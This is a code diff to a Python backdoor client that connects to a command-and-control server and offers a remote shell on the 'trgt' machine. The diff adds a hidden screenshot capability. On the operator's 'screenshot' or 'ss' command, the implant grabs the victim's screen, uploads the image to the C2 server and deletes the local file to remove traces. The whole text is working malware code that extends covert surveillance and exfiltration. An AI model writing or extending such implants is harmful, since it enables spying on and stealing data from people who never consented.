@@ -7,6 +7,9 @@ import os # library can be used to change directory by the C2 server owner, afte
 # The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network. 
 import json
 
+# python library for taking screenshot
+import PIL.ImageGrab
+
 
 # Sending whole data all at once
 def recv_eff():
@@ -68,6 +71,14 @@ def upload_file(file_name):
 	sock.send(file.read())
 
 
+# Screenshot function
+def screenshot():
+
+	img = PIL.ImageGrab.grab()
+
+	img.save(r'scrn_sht.png')
+
+
 # Offering a shell from trgt
 def shell():
 
@@ -112,6 +123,16 @@ def shell():
 
 			except:
 				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+
+
+		# Screenshot
+		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
+
+			screenshot() # Taking screenshot
+
+			upload_file('scrn_sht.png') # sending the ss to C2
+
+			os.remove('scrn_sht.png') # removing the ss from trgt
 
 
 		# Exfiltration in trgt point of view ✓
